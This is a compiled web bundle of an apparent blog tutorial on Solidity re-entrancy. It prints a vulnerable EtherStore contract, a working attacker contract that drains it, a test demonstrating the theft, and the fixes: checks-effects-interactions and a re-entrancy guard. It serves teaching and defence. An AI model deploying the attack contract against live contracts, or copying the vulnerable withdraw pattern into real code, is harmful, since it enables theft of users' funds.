(self.webpackChunkbuildany_website=self.webpackChunkbuildany_website||[]).push([[152],{59096:function(t,e,n){"use strict";n.r(e),n.d(e,{frontMatter:function(){return i},contentTitle:function(){return l},metadata:function(){return h},toc:function(){return d},default:function(){return p}});var a=n(87462),r=n(63366),o=(n(67294),n(3905)),s=n(93456),c=["components"],i={sidebar_position:1,tags:["re-entrancy","solidity","attack"]},l="Re-entrancy",h={unversionedId:"solidity-hacks/re-entrancy",id:"solidity-hacks/re-entrancy",title:"Re-entrancy",description:"Description",source:"@site/docs/solidity-hacks/re-entrancy.md",sourceDirName:"solidity-hacks",slug:"/solidity-hacks/re-entrancy",permalink:"/docs/solidity-hacks/re-entrancy",editUrl:"https://github.com/kkateq/blog/docs/solidity-hacks/re-entrancy.md",tags:[{label:"re-entrancy",permalink:"/docs/tags/re-entrancy"},{label:"solidity",permalink:"/docs/tags/solidity"},{label:"attack",permalink:"/docs/tags/attack"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["re-entrancy","solidity","attack"]},sidebar:"tutorialSidebar",previous:{title:"Content",permalink:"/docs/intro"},next:{title:"Overflow",permalink:"/docs/solidity-hacks/overflow"}},d=[{value:"Description",id:"description",children:[],level:3},{value:"How to test",id:"how-to-test",children:[],level:3},{value:"How to fix",id:"how-to-fix",children:[{value:"- Apply check-effects-interaction pattern",id:"--apply-check-effects-interaction-pattern",children:[],level:4},{value:"- Use Re-entrancy guard",id:"--use-re-entrancy-guard",children:[],level:4}],level:3},{value:"Demo",id:"demo",children:[],level:3}],u={toc:d};function p(t){var e=t.components,n=(0,r.Z)(t,c);return(0,o.kt)("wrapper",(0,a.Z)({},u,n,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"re-entrancy"},"Re-entrancy"),(0,o.kt)("h3",{id:"description"},"Description"),(0,o.kt)("p",null,"A re-entrancy exploit happens when one contract executes an external call to another contract that makes a recursive call back to the original function, causing interruption of the state transition. That allows the attacker to execute withdrawal again and again until all the funds are available drained. The simplest and most famous example of this attack is ",(0,o.kt)("inlineCode",{parentName:"p"},"EtherStore")," contract that allows depositing and withdrawing funds."),(0,o.kt)("p",null,"The issue there is on line 15. The function ",(0,o.kt)("inlineCode",{parentName:"p"},"withdraw")," sends ether to the sender via ",(0,o.kt)("inlineCode",{parentName:"p"},'msg.sender.call{value: bal}("")'),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/reentrancy/EtherStore.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStore.sol sourceClassName=source-code-link",title:"/contracts/reentrancy/EtherStore.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStore.sol",sourceClassName:"source-code-link"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n\n        // highlight-next-line\n        (bool sent, ) = msg.sender.call{value: bal}("");\n\n        require(sent, "Transfer failed.");\n\n        balances[msg.sender] = 0;\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n')),(0,o.kt)("p",null,"And our sender could be the following ",(0,o.kt)("inlineCode",{parentName:"p"},"Attack.sol")," malicious contract that decided to withdraw again during the payout fallback process on line 19:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/reentrancy/AttackEtherStore.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/AttackEtherStore.sol",title:"/contracts/reentrancy/AttackEtherStore.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/AttackEtherStore.sol"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ninterface IEtherStore {\n    function deposit() external payable;\n\n    function withdraw() external;\n}\n\ncontract AttackEtherStore {\n    IEtherStore public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = IEtherStore(_etherStoreAddress);\n    }\n\n    fallback() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            // highlight-next-line\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether);\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n")),(0,o.kt)("p",null,"Please refer to the following diagram to understand the attack sequence step by step. Note, I used John just for a display purpose here."),(0,o.kt)(s.Mermaid,{chart:"sequenceDiagram\n    autonumber\n    John->>EtherStore: deposit 1 ETH\n    Attacker->>EtherStore: deposit 1 ETH\n    loop Withdraw\n        Attacker->>EtherStore: call withdraw 1 ETH\n        EtherStore->>Attacker: send 1 ETH\n        Note right of EtherStore: Send deposited 1 ETH back to Attacker!\n        Attacker->>EtherStore: fallback calls withdraw again\n        EtherStore->>Attacker: send 1 ETH again!\n        Note right of EtherStore: Re-entrancy of the withdraw function before the Attacker balance is REDUCED.\n    end\n    Note right of John: MONEY ARE GONE!",mdxType:"Mermaid"}),(0,o.kt)("h3",{id:"how-to-test"},"How to test"),(0,o.kt)("p",null,"Both contracts could be tested locally using ",(0,o.kt)("a",{parentName:"p",href:"https://eth-brownie.readthedocs.io/en/stable/"},"brownie")," tools. It's pretty easy to run a unit test, following the attack sequence to reproduce the malicious behavior. The following unit test shows how exploiting the vulnerability the attack contract balance increases its balance:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:"title=/tests/reentrancy/test_ether_store_attack.py sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/reentrancy/test_ether_store_attack.py#L12",title:"/tests/reentrancy/test_ether_store_attack.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/reentrancy/test_ether_store_attack.py#L12"},'import pytest\nfrom brownie import exceptions\nfrom scripts.reentrancy.ether_store.deploy_and_attack import (\n    deploy_attack,\n    deploy_ether_store,\n    deploy_ether_store_fixed,\n)\nfrom scripts.utils import get_attacker_account, get_user_account\nfrom web3 import Web3\n\ndef test_ether_store_attack_successful():\n    # Deploy EtherStore smart contract\n    ether_store = deploy_ether_store()\n\n    # Initialize a user account\n    user_account = get_user_account()\n    deposit_amount_eth = 10\n    value_wei = Web3.toWei(deposit_amount_eth, "ether")\n\n    # User deposits 1 ether to EtherStore\n    tx = ether_store.deposit({"from": user_account, "value": value_wei})\n    tx.wait(1)\n\n    # Assert that EtherStore balance now is 10 ETH\n    assert ether_store.balanceOf() / 10**18 == 10\n\n    # Deploy Attack contract\n    attack_contract = deploy_attack(ether_store.address)\n\n    # Assert that Attack contract balance is 0 ETH\n    assert attack_contract.balanceOf() / 10**18 == 0\n\n    # Call `attack` function of Attack contract\n    attack_tx = attack_contract.attack(\n        {\n            "from": get_attacker_account(),\n            "value": Web3.toWei(1.5, "ether"),\n        }\n    )\n\n    attack_tx.wait(1)\n\n    # Assert that EtherStore balance now is 0 ETH\n    assert ether_store.balanceOf() / 10**18 == 0\n\n    # Assert that Attack contract balance is 11.5 ETH\n    assert attack_contract.balanceOf() / 10**18 == 11.5\n\n...\n')),(0,o.kt)("h3",{id:"how-to-fix"},"How to fix"),(0,o.kt)("h4",{id:"--apply-check-effects-interaction-pattern"},"- Apply ",(0,o.kt)("a",{parentName:"h4",href:"https://docs.soliditylang.org/en/v0.5.11/security-considerations.html#re-entrancy"},"check-effects-interaction")," pattern"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-diff",metastring:"title=/contracts/reentrancy/EtherStoreFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStoreFixed.sol#L16",title:"/contracts/reentrancy/EtherStoreFixed.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStoreFixed.sol#L16"},'function withdraw() public {\n    uint256 bal = balances[msg.sender];\n    require(bal > 0);\n\n+   balances[msg.sender] = 0;\n\n    // highlight-next-line\n    (bool sent, ) = msg.sender.call{value: bal}("");\n\n    require(sent, "Transfer failed.");\n\n-   balances[msg.sender] = 0;\n}\n')),(0,o.kt)("p",null,"The send call is moved to the end of this function. This wouldn't prevent executing the ",(0,o.kt)("inlineCode",{parentName:"p"},"withdrow")," function again by the attacker, but its balance is already 0. So the money transfer would not happen because of the ",(0,o.kt)("inlineCode",{parentName:"p"},"require(bal > 0)")," check."),(0,o.kt)("h4",{id:"--use-re-entrancy-guard"},"- Use Re-entrancy guard"),(0,o.kt)("p",null,"The re-entrancy guard will explicitly reject any re-entrancy request. One of the most common implementations of the ReentrancyGuard is from ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol"},"OpenZeppelin"),". Also, you could have one implemented by yourself to avoid dependencies."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"{5,7,11} title=/contracts/reentrancy/EtherStoreFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStoreFixed.sol#L4","{5,7,11}":!0,title:"/contracts/reentrancy/EtherStoreFixed.sol",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStoreFixed.sol#L4"},'\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport "@openzeppelin/contracts/security/ReentrancyGuard.sol";\n\ncontract EtherStoreFixed is ReentrancyGuard {\n\n    ...\n\n    function withdraw() public nonReentrant {\n        ...\n    }\n    ...\n\n')),(0,o.kt)("h3",{id:"demo"},"Demo"),(0,o.kt)("p",null,"The fixed version of the ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/reentrancy/EtherStoreFixed.sol"},(0,o.kt)("inlineCode",{parentName:"a"},"EtherStoreFixed"))," contract could be tested the same way. However, now the test should verify that re-entrancy into ",(0,o.kt)("inlineCode",{parentName:"p"},"withdraw")," fails:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python",metastring:"title=/tests/reentrancy/test_ether_store_attack.py#L51 sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/reentrancy/test_ether_store_attack.py#L51",title:"/tests/reentrancy/test_ether_store_attack.py#L51",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/reentrancy/test_ether_store_attack.py#L51"},'...\n\ndef test_ether_store_attack_failed():\n    # 1. Deploy EtherStore smart contracts\n    ether_store = deploy_ether_store_fixed()\n    user_account = get_user_account()\n    deposit_amount_eth = 10\n\n    value_wei = Web3.toWei(deposit_amount_eth, "ether")\n    tx = ether_store.deposit({"from": user_account, "value": value_wei})\n    tx.wait(1)\n    print(\n        f"Account {user_account.address} has deposited {deposit_amount_eth} ETH to EtherStore!"\n    )\n    print(f"Ether store balance {ether_store.balanceOf()/10**18} ETH")\n\n    # 2. Deploy Attack contract\n    attack_contract = deploy_attack(ether_store.address)\n\n    # 3. Call `attack` function of Attack contract\n    #  highlight-next-line\n    with pytest.raises(exceptions.VirtualMachineError):\n        attack_tx = attack_contract.attack(\n            {\n                "from": get_attacker_account(),\n                "value": Web3.toWei(1.5, "ether"),\n            }\n        )\n\n        attack_tx.wait(1)\n...\n')),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Thank you for reading and good luck with building secure blockchain!")))}p.isMDXComponent=!0},11748:function(t,e,n){var a={"./locale":89234,"./locale.js":89234};function r(t){var e=o(t);return n(e)}function o(t){if(!n.o(a,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return a[t]}r.keys=function(){return Object.keys(a)},r.resolve=o,t.exports=r,r.id=11748}}]);